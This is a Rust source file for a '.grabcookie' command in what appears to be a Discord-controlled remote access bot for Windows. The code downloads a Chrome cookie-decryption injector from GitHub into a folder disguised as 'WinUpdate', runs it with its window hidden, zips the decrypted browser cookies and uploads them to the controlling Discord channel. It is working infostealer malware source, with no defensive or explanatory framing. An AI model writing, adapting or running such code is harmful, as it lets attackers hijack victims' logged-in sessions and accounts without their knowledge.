use crate::commands::*;
use anyhow::{Context, Result};
use async_trait::async_trait;
use std::env;
use std::fs;
use std::io::Cursor;
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use twilight_model::http::attachment::Attachment;
use walkdir::WalkDir;
use zip::ZipArchive;

pub struct GrabCommand;

const MODULE_NAME: &str = "cookie-mod.exe";
const DOWNLOAD_URL: &str = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.1/chrome-injector-v0.17.1.zip";
// Was: https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.16.1/chrome-injector-v0.16.1.zip

impl GrabCommand {
    fn get_module_path() -> Result<PathBuf> {
        let username = env::var("USERNAME")
            .or_else(|_| env::var("USER"))
            .map_err(|_| anyhow::anyhow!("Error getting username"))?;

        let path = PathBuf::from(format!(
            r"C:\Users\{}\AppData\Local\Packages\WinUpdate\modules",
            username
        ));
        Ok(path)
    }
}

#[async_trait]
impl BotCommand for GrabCommand {
    fn name(&self) -> &str {
        "grabcookie"
    }
    fn description(&self) -> &str {
        "Grab cookies using auto-downloaded module"
    }
    fn category(&self) -> &str {
        "filesystem"
    }
    fn usage(&self) -> &str {
        ".grabcookie"
    }
    fn examples(&self) -> &'static [&'static str] {
        &[".grabcookie"]
    }
    fn aliases(&self) -> &'static [&'static str] {
        &["getmod"]
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        self.ensure_and_run_module(http, msg).await
    }
}

impl GrabCommand {
    async fn ensure_and_run_module(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let module_dir = Self::get_module_path()?;
        let module_path = module_dir.join(MODULE_NAME);

        if !module_dir.exists() {
            fs::create_dir_all(&module_dir)?;
        }

        if !module_path.exists() {
            let status_msg = http
                .create_message(msg.channel_id)
                .content("Module not found. Downloading from GitHub...")
                .await?
                .model()
                .await?;

            if let Err(e) = self.download_module().await {
                http.update_message(msg.channel_id, status_msg.id)
                    .content(Some(&format!("Failed to download module: {}", e)))
                    .await?;
                return Err(e);
            }

            http.update_message(msg.channel_id, status_msg.id)
                .content(Some("Download complete. Executing..."))
                .await?;
        } else {
            http.create_message(msg.channel_id)
                .content("Running cookie module...")
                .await?;
        }

        let output_dir = module_dir.join("output");
        if output_dir.exists() {
            let _ = fs::remove_dir_all(&output_dir);
        }

        match Self::run_cookie_mod(&module_path) {
            Ok(mut child) => {
                let _ = child.wait();

                if output_dir.exists() {
                    self.upload_results(http, msg, &output_dir).await?;
                } else {
                    http.create_message(msg.channel_id)
                        .content("Execution finished but no output folder found.")
                        .await?;
                }
            }
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("Error executing module: {}", e))
                    .await?;
            }
        }

        Ok(())
    }

    async fn download_module(&self) -> Result<()> {
        let module_dir = Self::get_module_path()?;
        if !module_dir.exists() {
            fs::create_dir_all(&module_dir)?;
        }

        let client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0")
            .build()?;

        let response = client.get(DOWNLOAD_URL).send().await?;
        if !response.status().is_success() {
            return Err(anyhow::anyhow!(
                "Download failed with status: {}",
                response.status()
            ));
        }

        let bytes = response.bytes().await?;
        let cursor = Cursor::new(bytes);
        let mut archive = ZipArchive::new(cursor)?;

        let arch = std::env::consts::ARCH;
        let target_suffix = match arch {
            "aarch64" => "_arm64.exe",
            _ => "_x64.exe",
        };

        let mut found = false;
        for i in 0..archive.len() {
            let mut file = archive.by_index(i)?;
            let filename = file.name().to_lowercase();

            if filename.ends_with(".exe") && filename.contains(target_suffix) {
                let mut out_file = fs::File::create(module_dir.join(MODULE_NAME))?;
                std::io::copy(&mut file, &mut out_file)?;
                found = true;
                break;
            }
        }

        if !found {
            for i in 0..archive.len() {
                let mut file = archive.by_index(i)?;
                let filename = file.name().to_lowercase();

                if filename.ends_with(".exe") {
                    if arch != "aarch64" && filename.contains("arm64") {
                        continue;
                    }

                    let mut out_file = fs::File::create(module_dir.join(MODULE_NAME))?;
                    std::io::copy(&mut file, &mut out_file)?;
                    found = true;
                    break;
                }
            }
        }

        if !found {
            return Err(anyhow::anyhow!(
                "No compatible executable found in downloaded archive"
            ));
        }

        Ok(())
    }

    fn run_cookie_mod(path: &Path) -> Result<std::process::Child> {
        let child = Command::new(path)
            .arg("all")
            .current_dir(path.parent().unwrap())
            .creation_flags(0x08000000)
            .spawn()
            .context("Failed to spawn module")?;
        Ok(child)
    }

    async fn upload_results(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        output_dir: &Path,
    ) -> Result<()> {
        let mut files_to_zip = Vec::new();
        let walker = WalkDir::new(output_dir).into_iter();

        for entry in walker.filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() {
                if let Ok(name) = path.strip_prefix(output_dir) {
                    files_to_zip.push((path.to_path_buf(), name.to_string_lossy().into_owned()));
                }
            }
        }

        if files_to_zip.is_empty() {
            http.create_message(msg.channel_id)
                .content("No results found in output folder.")
                .await?;
            return Ok(());
        }

        let zip_path = std::env::temp_dir().join(format!("cookies_{}.zip", uuid::Uuid::new_v4()));
        let file = fs::File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);

        for (disk_path, zip_name) in files_to_zip {
            zip.start_file(zip_name, options)?;
            let mut f = fs::File::open(disk_path)?;
            std::io::copy(&mut f, &mut zip)?;
        }
        zip.finish()?;

        let zip_content = fs::read(&zip_path)?;
        let _ = fs::remove_file(&zip_path);
        let _ = fs::remove_dir_all(output_dir);

        http.create_message(msg.channel_id)
            .content("Cookies grabbed successfully!")
            .attachments(&[Attachment::from_bytes(
                "cookies.zip".to_string(),
                zip_content,
                1,
            )])
            .await?;

        Ok(())
    }
}
